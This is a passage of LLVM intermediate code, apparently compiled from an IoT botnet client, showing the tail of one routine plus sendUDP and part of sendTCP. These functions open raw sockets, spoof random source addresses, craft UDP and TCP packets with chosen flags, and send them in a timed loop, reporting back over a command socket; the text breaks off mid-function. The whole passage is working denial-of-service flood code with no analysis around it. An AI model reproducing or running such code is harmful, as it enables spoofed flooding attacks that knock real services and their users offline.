  %1166 = load i32, i32* %4, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 3
  store i8 1, i8* %1169, align 1
  br label %1170

; <label>:1170:                                   ; preds = %1155, %1146
  br label %1171

; <label>:1171:                                   ; preds = %1170, %988, %960, %932, %904, %880, %732, %668, %540, %476, %389, %233, %70
  br label %1172

; <label>:1172:                                   ; preds = %1171, %1079, %1025, %973, %945, %917, %889, %838, %813, %785, %717, %694, %617, %603, %525, %502, %422, %314, %186, %142
  %1173 = load i32, i32* %4, align 4
  %1174 = add nsw i32 %1173, 1
  store i32 %1174, i32* %4, align 4
  br label %66

; <label>:1175:                                   ; preds = %66
  br label %64
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %269

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %104

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %269

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #2
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %59
  br label %269

; <label>:67:                                     ; preds = %59
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %71, i32 1, i1 false)
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %72, i32 %73)
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %74, %75
  store i32 %76, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %100, %99, %67
  %78 = load i32, i32* %15, align 4
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %83 = call i64 @sendto(i32 %78, i8* %79, i64 %81, i32 0, %struct.sockaddr* %82, i32 16)
  %84 = load i32, i32* %18, align 4
  %85 = load i32, i32* %14, align 4
  %86 = icmp eq i32 %84, %85
  br i1 %86, label %87, label %100

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %8, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %87
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %92, i16* %93, align 2
  br label %94

; <label>:94:                                     ; preds = %90, %87
  %95 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %96 = load i32, i32* %17, align 4
  %97 = icmp sgt i32 %95, %96
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %94
  br label %103

; <label>:99:                                     ; preds = %94
  store i32 0, i32* %18, align 4
  br label %77

; <label>:100:                                    ; preds = %77
  %101 = load i32, i32* %18, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %18, align 4
  br label %77

; <label>:103:                                    ; preds = %98
  br label %269

; <label>:104:                                    ; preds = %46
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @mainCommSock, align 4
  %110 = call i32 (i32, i8*, ...) @sockprintf(i32 %109, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %269

; <label>:111:                                    ; preds = %104
  store i32 1, i32* %20, align 4
  %112 = load i32, i32* %19, align 4
  %113 = bitcast i32* %20 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #2
  %115 = icmp slt i32 %114, 0
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %269

; <label>:119:                                    ; preds = %111
  store i32 50, i32* %21, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %119
  %121 = load i32, i32* %21, align 4
  %122 = add nsw i32 %121, -1
  store i32 %122, i32* %21, align 4
  %123 = icmp ne i32 %121, 0
  br i1 %123, label %124, label %129

; <label>:124:                                    ; preds = %120
  %125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %126 = call i32 @rand_cmwc()
  %127 = xor i32 %125, %126
  call void @srand(i32 %127) #2
  %128 = call i32 @rand() #2
  call void @init_rand(i32 %128)
  br label %120

; <label>:129:                                    ; preds = %120
  %130 = load i32, i32* %10, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  store i32 0, i32* %22, align 4
  br label %139

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %10, align 4
  %135 = sub nsw i32 32, %134
  %136 = shl i32 1, %135
  %137 = sub nsw i32 %136, 1
  %138 = xor i32 %137, -1
  store i32 %138, i32* %22, align 4
  br label %139

; <label>:139:                                    ; preds = %133, %132
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 28, %141
  %143 = call i8* @llvm.stacksave()
  store i8* %143, i8** %23, align 8
  %144 = alloca i8, i64 %142, align 16
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %24, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = getelementptr i8, i8* %147, i64 20
  %149 = bitcast i8* %148 to %struct.udphdr*
  store %struct.udphdr* %149, %struct.udphdr** %25, align 8
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 4
  %154 = load i32, i32* %22, align 4
  %155 = call i32 @getRandomIP(i32 %154)
  %156 = call i32 @htonl(i32 %155) #13
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 8, %158
  %160 = trunc i64 %159 to i32
  call void @makeIPPacket(%struct.iphdr* %150, i32 %153, i32 %156, i8 zeroext 17, i32 %160)
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 8, %162
  %164 = trunc i64 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #13
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.2* %167 to %struct.anon.3*
  %169 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %168, i32 0, i32 2
  store i16 %165, i16* %169, align 2
  %170 = call i32 @rand_cmwc()
  %171 = trunc i32 %170 to i16
  %172 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.2* %173 to %struct.anon.3*
  %175 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %174, i32 0, i32 0
  store i16 %171, i16* %175, align 2
  %176 = load i32, i32* %8, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %180

; <label>:178:                                    ; preds = %139
  %179 = call i32 @rand_cmwc()
  br label %185

; <label>:180:                                    ; preds = %139
  %181 = load i32, i32* %8, align 4
  %182 = trunc i32 %181 to i16
  %183 = call zeroext i16 @htons(i16 zeroext %182) #13
  %184 = zext i16 %183 to i32
  br label %185

; <label>:185:                                    ; preds = %180, %178
  %186 = phi i32 [ %179, %178 ], [ %184, %180 ]
  %187 = trunc i32 %186 to i16
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.2* %189 to %struct.anon.3*
  %191 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %190, i32 0, i32 1
  store i16 %187, i16* %191, align 2
  %192 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.2* %193 to %struct.anon.3*
  %195 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %194, i32 0, i32 3
  store i16 0, i16* %195, align 2
  %196 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %197 = bitcast %struct.udphdr* %196 to i8*
  %198 = getelementptr inbounds i8, i8* %197, i64 8
  %199 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %198, i32 %199)
  %200 = bitcast i8* %144 to i16*
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  %203 = load i16, i16* %202, align 2
  %204 = zext i16 %203 to i32
  %205 = call zeroext i16 @csum(i16* %200, i32 %204)
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 7
  store i16 %205, i16* %207, align 2
  %208 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %208, %209
  store i32 %210, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %211

; <label>:211:                                    ; preds = %264, %263, %185
  br label %212

; <label>:212:                                    ; preds = %211
  %213 = load i32, i32* %19, align 4
  %214 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %213, i8* %144, i64 %142, i32 0, %struct.sockaddr* %214, i32 16)
  %216 = call i32 @rand_cmwc()
  %217 = trunc i32 %216 to i16
  %218 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.2* %219 to %struct.anon.3*
  %221 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %220, i32 0, i32 0
  store i16 %217, i16* %221, align 2
  %222 = load i32, i32* %8, align 4
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %226

; <label>:224:                                    ; preds = %212
  %225 = call i32 @rand_cmwc()
  br label %231

; <label>:226:                                    ; preds = %212
  %227 = load i32, i32* %8, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #13
  %230 = zext i16 %229 to i32
  br label %231

; <label>:231:                                    ; preds = %226, %224
  %232 = phi i32 [ %225, %224 ], [ %230, %226 ]
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.2* %235 to %struct.anon.3*
  %237 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %236, i32 0, i32 1
  store i16 %233, i16* %237, align 2
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 3
  store i16 %239, i16* %241, align 4
  %242 = load i32, i32* %22, align 4
  %243 = call i32 @getRandomIP(i32 %242)
  %244 = call i32 @htonl(i32 %243) #13
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 8
  store i32 %244, i32* %246, align 4
  %247 = bitcast i8* %144 to i16*
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  %250 = load i16, i16* %249, align 2
  %251 = zext i16 %250 to i32
  %252 = call zeroext i16 @csum(i16* %247, i32 %251)
  %253 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 7
  store i16 %252, i16* %254, align 2
  %255 = load i32, i32* %27, align 4
  %256 = load i32, i32* %14, align 4
  %257 = icmp eq i32 %255, %256
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %231
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %26, align 4
  %261 = icmp sgt i32 %259, %260
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %258
  br label %267

; <label>:263:                                    ; preds = %258
  store i32 0, i32* %27, align 4
  br label %211

; <label>:264:                                    ; preds = %231
  %265 = load i32, i32* %27, align 4
  %266 = add i32 %265, 1
  store i32 %266, i32* %27, align 4
  br label %211

; <label>:267:                                    ; preds = %262
  %268 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

; <label>:269:                                    ; preds = %267, %116, %108, %103, %66, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
